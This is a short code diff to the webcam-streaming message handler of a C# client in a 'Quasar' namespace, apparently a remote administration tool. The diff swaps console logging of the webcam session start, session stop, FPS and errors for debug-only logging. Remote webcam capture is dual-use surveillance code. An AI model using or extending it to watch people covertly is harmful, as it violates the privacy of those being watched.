@@ -62,7 +62,7 @@ namespace Quasar.Client.Messages
         private void StartScreenStreaming(ISender client, GetWebcam message)
         {
             _webcamHelper.StartWebcam(message.DisplayIndex);
-            Console.WriteLine("Starting remote webcam session");
+            Debug.WriteLine("Starting remote webcam session");
 
             var webcamBounds = _webcamHelper.GetBounds();
             var resolution = new Resolution { Height = webcamBounds.Height, Width = webcamBounds.Width };
@@ -106,7 +106,7 @@ namespace Quasar.Client.Messages
         private void StopWebcamStreaming()
         {
             _webcamHelper.StopWebcam();
-            Console.WriteLine("Stopping remote webcam session");
+            Debug.WriteLine("Stopping remote webcam session");
 
             _cancellationTokenSource?.Cancel();
 
@@ -171,14 +171,14 @@ namespace Quasar.Client.Messages
                 _frameCount++;
                 if (_stopwatch.ElapsedMilliseconds >= 1000)
                 {
-                    Console.WriteLine($"FPS: {_frameCount}");
+                    Debug.WriteLine($"FPS: {_frameCount}");
                     _frameCount = 0;
                     _stopwatch.Restart();
                 }
             }
             catch (Exception ex)
             {
-                Console.WriteLine($"Error capturing screen: {ex.Message}");
+                Debug.WriteLine($"Error capturing screen: {ex.Message}");
             }
             finally
             {
